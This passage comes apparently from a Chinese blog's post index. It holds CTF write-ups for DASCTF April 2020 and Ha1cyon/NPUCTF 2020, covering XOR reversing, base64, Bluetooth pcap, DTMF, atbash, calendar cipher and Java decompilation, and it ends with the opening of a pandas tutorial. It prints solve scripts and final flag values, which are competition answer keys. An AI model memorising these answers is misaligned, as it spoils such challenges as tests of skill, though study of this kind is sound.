&amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v8 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"I will mix them with the enc_flag!\", v7); std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); for ( j = 0; j &lt;= 37; ++j ) { v10 = 0; for ( k = 0; k &lt; v11; ++k ) v10 ^= *(_BYTE *)(k + v15); putchar(v10 ^ (unsigned __int8)*(&amp;v16 + j)); } std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"\\nMaybe you have found the `flag`\\n\", v9); return 0LL; } 是 Cpp 唉。虽然逆向出来有点丑emmm。 大概意思是先让你输入一个 magic number，如果v11 &lt;= 9则返回 -1 退出，说明输入的数要大于9。 然后依次输入v11个数，存到v15及之后的空间内。 后面输出了一个 enc_flag。重点就是这几句嘛。 for ( j = 0; j &lt;= 37; ++j ) { v10 = 0; for ( k = 0; k &lt; v11; ++k ) v10 ^= *(_BYTE *)(k + v15); putchar(v10 ^ (unsigned __int8)*(&amp;v16 + j)); } std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"\\nMaybe you have found the `flag`\\n\", v9); 正好前面那串数字就有38个。看来起始的几个字符为 flag。 v10依次和输入的每个数异或一下，再输出v10和最开始那串数字异或的结果。 逆向的话，只要找到 flag 就完事了！ 于是直接爆破好了！ Exp： 输了几个数字觉得太麻烦了，于是直接正则匹配好了。 import re s = \"\"\" v16 = 38; v17 = 44; v18 = 33; v19 = 39; v20 = 59; v21 = 35; v22 = 34; v23 = 115; v24 = 117; v25 = 114; v26 = 113; v27 = 33; v28 = 36; v29 = 117; v30 = 118; v31 = 119; v32 = 35; v33 = 120; v34 = 38; v35 = 114; v36 = 117; v37 = 113; v38 = 38; v39 = 34; v40 = 113; v41 = 114; v42 = 117; v43 = 114; v44 = 36; v45 = 112; v46 = 115; v47 = 118; v48 = 121; v49 = 112; v50 = 35; v51 = 37; v52 = 121; v53 = 61; \"\"\" t = re.compile(r'v\\d{2} = (\\d+);') result = re.findall(t, s) # print(result) l = list(map(int, result)) print(l) # [38, 44, 33, 39, 59, 35, 34, 115, 117, 114, 113, 33, 36, 117, 118, 119, 35, 120, 38, 114, 117, 113, 38, 34, 113, 114, 117, 114, 36, 112, 115, 118, 121, 112, 35, 37, 121, 61] 得到一系列的数字，转换为字符串。上面用了 map，下面这里用用生成式的写法，嘻嘻。 而后先找出flag对应的v10，再用它来异或就完事了。 l_str = [chr(x) for x in l] s2 = ''.join(l_str) print(s2) # &amp;,!';#\"surq!$uvw#x&amp;ruq&amp;\"qrur$psvyp#%y= for i in range(10, 100): tmp = chr(ord(s2[0]) ^ i) if tmp == 'f'or tmp == 'F': print(tmp, i) # f 64 # F 96 final = '' for x in s2: final += chr(ord(x) ^ 64) print(final) # flag{cb3521ad567c8f251fb1252d03690ce9} 得到 flag： flag{cb3521ad567c8f251fb1252d03690ce9} Misc（签到题）6G还远吗？ 5G都来了，6G还远吗？6G下还需要开会员才能高速下载吗？请提交 DASCTF{} 里的内容。 http://server.zhaoj.in:8888/1GTest.file or http://das.wetolink.com:8888/1GTest.file 文件大小显示是 977MB，然而下载速度慢到 1KB/s 不到，还不允许多线程…… 想到估计是假的文件，毕竟是签到题，应该不难的。（才不像上个比赛假的签到 于是按下 F12，就看接收到的这部分 payload 好了。 或者就接收一部分然后截断也行。 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 扔去 base64 解密，就可以得到 flag。 果然 flag 就在文件最开头哈哈哈~ DASCTF{welcome_to_DAS_Ap1r1} blueshark Can you dig something you want out from the sea-colored beautiful shark? 题目附件：在这里 一个流量包，看了是蓝牙协议，呜又是没见过的。发现 Wireshark 还可以分析蓝牙数据包唉。（（其实好多都可以 binwalk 发现了一个 7z 的压缩包，直接当成压缩包打开，发现有个 password_is_Bluetooth_PIN.txt文件，看来得找 PIN 了。 从数据包这里也找到了这个压缩包。 本来以为 PIN 就是4位的，还想爆破一波。。结果发现不是。 后面大佬说是在网络流里可以找到 PIN，emmm？ 噢，Ctrl + F，选择 分组详情 或者 分组列表，字符串 或者 正则表达式，这样搜就找到了。 PIN 就是 141854。 用来解压就可以得到 flag。 flag{6da01c0a419b0b56ca8307fc9ab623eb} 导出这个压缩包可以先选中，再 Ctrl + Shift + X导出分组字节流。而后保存到文件打开就行。 后面有空再了解一下内存取证什么的（这次好像有一题 题目版权归官方所有。 以上内容仅供学习研究使用，请勿用于非法用途。 好像这篇有点水唉（先不管了 周日还要补周一的课呢（ （溜了溜了","path":"2020/04/25/CTF_2020DASCTF_April/"},{"title":"CTF | 2020 Ha1cyon_CTF公开赛 WriteUp","text":"前言看 CTF 群里有大佬引流，说周末西北瓜大（NPU）有个 CTF 比赛，据说对萌新比较友好，于是就来看了看。 官方平台地址：http://ha1cyon-ctf.fun:666/ 周六比赛刚开始，平台就被 DDoS 了，于是那时只下载了一道题目的附件就啥也没了……比赛过程中平台也屡受攻击，端口换了好几次，比如 666-&gt;777-&gt;778-&gt;777-&gt;98x，平台用动态端口还是第一次见呢 23333。 结果比赛时间一直拖到了周二晚上，题目还越来越多，噢，是不会的题目越来越多了！ 随便写点 Writeup 好了，主要是会做的部分吧，顺便记录了一下做题的体会啦。 （后面再看心情会不会按照大佬们的 WP 复现一下 MiscHappyCheckInVerification压缩包中的 endLocator 被改到最前面了，挪回去。然后把伪加密去掉。修改如下面红色部分所示。 解压出来一个是黑人抬棺的视频（真的有啊。。），另一个是一个二维码。 拉到 PS 里补上三个角，得到下面这图。 扫码得到： ?flag{this_is_not_flag}三曳所諳陀怯耶南夜缽得醯怯勝數不知喝盧瑟侄盡遠故隸怯薩不娑羯涅冥伊盧耶諳提度奢道盧冥以朋罰所即栗諳蒙集皤夷夜集諳利顛呐寫無怯依奢竟#￥#%E68BBFE4BD9BE68B89E6A0BCE79A84E5A7BFE58ABFE59CA8E69C80E5908E32333333||254333254242254338254342254231254338254345254432254238254643254236254145254239254441254437254234254232254131254236254245253244253244254343254438254330254341254336254435...sadwq#asdsadasf faf$use$dasdasdafafa_$ba##se64$ 第一部分 三曳所諳陀怯耶南夜缽得醯怯勝數不知喝盧瑟侄盡遠故隸怯薩不娑羯涅冥伊盧耶諳提度奢道盧冥以朋罰所即栗諳蒙集皤夷夜集諳利顛呐寫無怯依奢竟 这一段扔去佛曰，得到： 说了这不是佛拉格，你还来转？给爷爪巴 佛拉格 flag 可还行…看来不是了。 中间一段 E68BBFE4BD9BE68B89E6A0BCE79A84E5A7BFE58ABFE59CA8E69C80E5908E32333333 拿去 base16 一下得到： 拿佛拉格的姿势在最后2333 下一部分 254333254242254338254342254231254338254345254432254238254643254236254145254239254441254437254234254232254131254236254245253244253244254343254438254330254341254336254435 base16 得到： %C3%BB%C8%CB%B1%C8%CE%D2%B8%FC%B6%AE%B9%DA%D7%B4%B2%A1%B6%BE%2D%2D%CC%D8%C0%CA%C6%D5 看上去是 urlencode，解码得到： （这里气死我了，居然用的 gb2312 编码而不是 UTF-8，我以为假的半天解不出来，虽然的确没啥用… 没人比我更懂冠状病毒–特朗普 后面这部分没看明白，但感觉是提示了 use base64. 另外，发现黑人抬棺视频里又出现了熟悉的拨号声，就是之前在XCTF高校战“疫”里碰到的 DTMF 信号。 于是把视频导出了音频，然后拖到 Audacity 里，查看频谱图，提取出带有拨号声的片段，并限制频率范围，得到下面的图。 1209 Hz 1336 Hz 1477 Hz 1633 Hz 697 Hz 1 2 3 A 770 Hz 4 5 6 B 852 Hz 7 8 9 C 941 Hz * 0 # D 对照表格得到 418070885。（可能有误，应该是个手机号码，可能漏了几位 （是 13418070885 base64 -&gt; NDE4MDcwODg1 MTM0MTgwNzA4ODU= 套上flag，flag{nde4mdcwodg1} 发现不对！！！！！ （然后做不下去了嘤嘤嘤 赛后找到了一个软件可以分析 DTMF 信号，就是 **dtmf2num.exe*，在这里可以下载。这里是它 sourceforge 的项目地址。（好古老一个软件了* 不过这题要用软件的话需要截取对应的片段才行，毕竟 BGM 太杂了而且频率信号比较有规律…… By the way，抛开题目来说，这个 BGM 就属于电音嘛，就一堆有规律的频率信号的组合唉，还带有连续调频。。 后面看了大佬的 WP，发现需要把 b64encode 后的结果发到西北瓜大信安协会的公众号（NWPUSEC）（居然这样引流！），得到一个音频信号，是无线电传输的图像，解码得到的图片里就有 flag…… （真想不出来，啊是无线电大佬！Misc 真的杂。 抽象带师 NPUCTF{欢迎来到西北工业大学CTF比赛世界上最简单的比赛} 您也是抽象带师？ 再也不信什么 Easy/(Real) Ez/Baby/Basic/Not Hard/… 都是假的假的。 parts好几个parts，zde0, zde1, zfr0, … 看文件头是一堆压缩包，解出来有个 hint Here's the hint: 33 * 33 = 1089 And everything is inside the image 还有一张图，BV1kx411F7Fn.png 看来 flag 在图片里，不过 33*33 没看明白。 foremost 提取不出来，看 Hex 文件是有点问题。 图片文件名看上去像是 B站的 BV 号，上去看了一下没找到什么线索…… 吃了它may be hint.txt提示 emmmmm... something important was hidden in secret, but I can't find it! lookatme.txt 下面有一段莫名奇妙的空白字符。不清楚啥玩意了。 secret文件头是 MPE1（4D 50 45 31），搜了一下没找到相关的文件格式呢。 蹲 WP。 Web查源码终于看到有送分题了！ 就是查源码完事。 F12 禁掉了，用 Ctrl + Shift + C 或者点浏览器的 Web 开发者 之类的就行。 CryptoClassical_Cipherkey.txt 中提示： 解密后的flag请用flag{}包裹 压缩包密码：gsv_pvb_rh_zgyzhs 对应明文： ***_key_**_****** 看了一下，不是凯撒。于是丢到 quipqiup 去解密，已知 pvb=key。 根据得到的答案，大概形式是 the_key_is_??????，后面这个不大对，于是改变 clues 为 pvb=key rh=is gs=th，得到合理的解为 the_key_is_atbash。 噢，赛后发现这是 atbash 编码（埃特巴什码），一种古典的密码。 密文就是字母表反过来对应位置的字母，即密文和明文字母的对应位置之和为27. 常文：A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 密文：Z Y X W V U T S R Q P O N M L K J I H G F E D C B A 拿这个密码去解压 flag.zip，得到一张图片。 又是抽象带师。有一部分是猪圈密码的变种，见下图。 C??SSIC??C??E 剩下的突然想到是字符形状的字体了，联想题目 Classical Cipher，应该是 classical。 找了个识别字体的网站，比如这个，然后对应一波发现真的有！ 在 Egypt0 Regular 里没找到，倒是在 ROSETTA STONE Regular 里找到了。 于是就是 CLASSICALCODE（其实对应上D就猜到是code了）。flag{CLASSICALCODE}交上去发现不对，要换成小写。 flag{classicalcode} 原来这是古埃及象形文字… 更多密码可以看这篇文章：http://www.tuicool.com/articles/2E3INnm 这是什么觅🐎 2020年4月 F1 W1 S22 S21 T12 S11 W1 S13 是日历密码唉！（真会玩呢 3 1 12 5 14 4 1 18 l=[3,1,12,5,14,4,1,18] s='' for i in l: s+=chr(ord('A')+i-1) print(s) 得到 CALENDAR flag{calendar} 日历密码原则： （1）1—26代表a—z26个英文字母；（2）M,T1,W,T2,F,S1,S2分别代表周一到周日七天（英文首字母代替，1，2为了有别，也人为增加密度）；（3）密钥即密码表 以2007年11月份的日历为密码表，我们来加密这个单词：dictionary第一步，用数字代替明文中的字母，即D I C T I O N A R Y; 4 9 3 20 9 15 14 1 18 25第二步，写密文。方法：例如单词首字母D用4代替，则在日历中找到4号，发现是本月第一个星期日，所以用S21表示；又如第七个字母N用数字14代表，找到14号，发现是本月第二个星期三，用W2代表。如此类推，得到密文如下：S21 F2 S11 T13 F2 T23 W2 T21 S23 S24 此类密码的解法如下：（1）首先要知道密钥，即密码表；（2）其次分解密码中的星期 i，即变成星期+数字的形式；（3）去寻找对应的是第几个出现的星期 i，对应日期；（4）对应字母，练成单词，短语或句子。 认清形势，建立信心题目如下，看上去就是 RSA 之类的吧。 from Crypto.Util.number import * from gmpy2 import * from secret import flag p = getPrime(25) e = # Hidden q = getPrime(25) n = p * q m = bytes_to_long(flag.strip(b\"npuctf{\").strip(b\"}\")) c = pow(m, e, n) print(c) print(pow(2, e, n)) print(pow(4, e, n)) print(pow(8, e, n)) ''' 169169912654178 128509160179202 518818742414340 358553002064450 ''' 这次去看了一些 RSA 的知识，然而不大明白这些加密算法，更不了解相关的解密算法，还没有 OI 基础，于是题目看起来挺简单的然而还是不大会解 emmm（（ （Crypto模块都不大熟有哪些现成方法，gmpy2 模块装了半天还没装好。。 题目应该叫 认清形势，放弃幻想 才对吧。 Reversemachine（不记得题目了 这题是个 Java 写的应用，拿去 Java Decompiler 反编译了一下，得到： 虽然也没学过 Java，但大概意思还是能看个大概的。 public class Gui extends Frame { public void c() { JFrame f = new JFrame(\"gkd\"); f.setBounds(400, 250, 600, 450); f.setLayout(null); final Container j = f.getContentPane(); JButton c = new JButton(\"奥里给\"); final JTextField b = new JTextField(20); final JLabel l = new JLabel(\"\"); JLabel saying = new JLabel(\"团长说:180298505946947064650759\"); b.addKeyListener(new KeyListener() { public void keyTyped(KeyEvent e) { int c = e.getKeyChar(); if ((c &lt; 48) || (c &gt; 57)) { e.consume(); } } public void keyReleased(KeyEvent e) {} public void keyPressed(KeyEvent e) {} }); c.addActionListener(new ActionListener() { public void actionPerformed(ActionEvent e) { String s = b.getText(); boolean u = true; for (int i = 0; i &lt; s.length(); i++) { if ((s.charAt(i) &lt; '0') || (s.charAt(i) &gt; '9')) { u = false; } } if ((u) &amp;&amp; (new BigInteger(\"100\").compareTo(new BigInteger(s)) == 1)) { u = false; } if (!u) { l.setText(\"逗爷玩呢,给爷爪巴,再玩下去团长就要唱希望之花了\");return; } Lib f = new Lib(s); BigInteger b = f.e(); l.setText(\"n=\" + b.toString() + \",e=65537\"); j.validate(); } }); b.setBounds(200, 120, 200, 50); c.setBounds(250, 200, 100, 30); l.setBounds(150, 260, 300, 50); saying.setBounds(190, 60, 220, 30); j.add(b); j.add(c); j.add(l); j.add(saying); f.setDefaultCloseOperation(3); f.setVisible(true); } 这上面的代码都是控制 GUI 的，给输入框绑定了函数，如果不是数字（’0’-‘9’）的话就销毁（输入不显示在框里）。 给 button 绑定了执行函数，首先判断输入字符是不是数字，再比较输入的数字是否 &gt;100，如果都不成立就输出 逗爷玩呢,给爷爪巴,再玩下去团长就要唱希望之花了。 Lib f = new Lib(s); BigInteger b = f.e(); l.setText(\"n=\" + b.toString() + \",e=65537\"); 都成立的话再用输入的数字去实例化 LIb，看上面这几行感觉就是算大整数n了，又是 RSA？ 按照上面的规则输入几个数字试了试，发现程序卡死，疯狂占用 CPU 的一个核心（单线程呢）进行运算。 是在干嘛噢，下面看看 Lib 类吧。 package machine; import java.math.BigInteger; import java.util.HashMap; import java.util.Map; import java.util.Random; import java.util.Set; import java.util.Stack; public class Lib { private BigInteger b; private Map&lt;BigInteger, Integer&gt; m; private static final int B = 150; private void f() { BigInteger T = new BigInteger(\"3\"); BigInteger t = new BigInteger(\"2\"); BigInteger t1 = new BigInteger(\"0\"); for (int i = 0; this.b.mod(t).equals(t1); i++) { this.b = this.b.divide(t); } this.m.put(t, Integer.valueOf(i)); for (i = 0; this.b.mod(T).equals(t1); i++) { this.b = this.b.divide(T); } this.m.put(T, Integer.valueOf(i)); } private void s() { while (!this.b.equals(BigInteger.ONE)) { BigInteger d = new BigInteger(150, new Random()); for (int i = 0; i &lt; 3; i++) { d = d.add(BigInteger.ONE); } if (this.b.mod(d).equals(BigInteger.ZERO)) { this.b = this.b.divide(d); for (BigInteger j = new BigInteger(\"5\"); d.compareTo(j) == 1; j.add(BigInteger.ONE)) { if (d.mod(j).equals(BigInteger.ZERO)) { this.m.replace(j, Integer.valueOf(((Integer)this.m.get(j)).intValue() + 1)); j = j.subtract(BigInteger.ONE); d = d.divide(j); } } this.m.replace(d, Integer.valueOf(((Integer)this.m.get(d)).intValue() + 1)); } } } public BigInteger e() { Set&lt;BigInteger&gt; p = this.m.keySet(); Stack&lt;BigInteger&gt; o = new Stack(); BigInteger d = BigInteger.ONE; for (BigInteger q : p) { o.push(q); } d = d.multiply((BigInteger)o.elementAt(o.size() - 1)); d = d.multiply((BigInteger)o.elementAt(o.size() - 2)); return d; } Lib(String num) { this.b = new BigInteger(num); this.m = new HashMap(); f(); s(); } } 看最下面的函数，首先 b 为输入的数字，m为一个 HashMap（不是很懂？ f()函数先是不断让 b/2 直到 b mod 2 == 0，然后把这时的 2 和索引 i 放入 m；之后同理让 b/3，把 3 和索引 i 放入 m。 s()函数…… （做到这里后面有事就没看下去了 蹲个大佬的 WP 看看。 其他题这次还有挺多有意思的题目吧。 比如 Misc 有道 Minecraft 的题目，看截图还有红石电路的，不过倒是没人做出来罢了。 Reverse 里有个 R_E_5_E_T.exe 是用 VB 写的，神器 IDA 就直接用不了了，貌似还加了壳，给了一堆 hint 然而并不会做。 有道题 are-you-a-fan 用了一堆位运算，hint 是 NAND（数电里的？），哇呜难顶。 Crypto 里有个 EzRSA，文件名是 difficultrsa.py，噢暴露真相了2333。 到最后还出了 OI 的题（没玩过，再见）……目睹了问号？大佬疯狂秒题，？？？ 小结这次比赛平台是用 docker 部署的 CTFd，上了动态 flag 和独立环境，从这个角度而言做题感受挺好的。只是独立环境直接绑定到了同一个域名 ha1cyon-ctf.fun 下的不同端口，不像之前见过的动态域名，可能比较容易被扫描，从而容易被攻击吧（猜的。 看了一下平台是直接用 Gunicorn 搭建的 web 服务就上公网了，没套 Nginx 之类的反代，也没加 WAF 来着。不过没怎么了解也不大清楚 Gunicorn 应对高并发的能力如何。 总体感觉这次 CTF 运维赛 题目好多啊，难度好大啊，基本没见过的套路呢。题目质量还不错，就是啥都不会，嘤嘤嘤。 虽说算是业余玩玩的，但也想好好学点东西呢。 看了大佬们的WP，膜一波。 顺便再膜一下用学生机灵活应对高并发的运维大佬。 周日还打了个虎符 CTF（2020数字中国创新大赛-虎符网络安全赛道），发现题目大都新鲜出炉的。果然爆零，题目做到自闭。。 Misc 题一堆密码题，哇呜不会做…… 有道 python 逆向题disasm，给了对字节码反编译后得到的代码（可以利用dis.dis帮助分析），哇第一次看到了 python 的底层实现，真就和汇编差不多，感觉挺能帮助理解 Py 原理的。看了几篇文章了解了一下，然而手动逆向到自闭都没分析不完，最后就放弃了。 A Python Interpreter Written in Python 死磕python字节码-手工还原python源码 Web 题用 nodejs 伪造 PHP 可还行，然而真好，都是我不会的。 不写了不写了。 等后面有机会再来复现吧。 （溜了溜了","path":"2020/04/21/CTF_2020Ha1cyonCTF/"},{"title":"数据科学 | 十分钟入门pandas/常用方法笔记","text":"0x00 前言最近对数据科学有点感兴趣，众所周知，在 python 中用来做数据处理常用的有 numpy、pandas 等模块，它们功能非常强大。 考虑到有项目正好要用到 pandas，这次就来学一下吧。（挺久之前就想学的，一直咕 看到网上推荐了官方的 10 Minutes to pandas，就去看了一下，翻译了一下官方的教程，自己跑了代码，顺便再记了点笔记吧。 下面的内容主要参考的是10 Minutes to pandas（然而看了一晚上），运行环境为 Jupyter Notebook。 这篇博客也是在从 Jupyter Notebook 里导出的 markdown 基础上完成的，挺方便的呢。（有些地方可能由于博客样式的原因显示会有点问题，凑合着看一看吧。 后面有空再整理一下，放个 Jupyter Notebook 的.ipynb版本吧。 —-&gt;详见文末的更新！ 0x01 导入模块import pandas as pd import matplotlib.pyplot as plt import numpy as np 这些都是常用别名了呢（ 0x02 创建对象 Object Creation传递一个list对象来创建一个Series，pandas会默认创建整型索引(index)。 s = pd.Series([1,3,5,np.nan,6,8]) s 0 1.0 1 3.0 2 5.0 3 NaN 4 6.0 5 8.0 dtype: float64 传递一个numpy 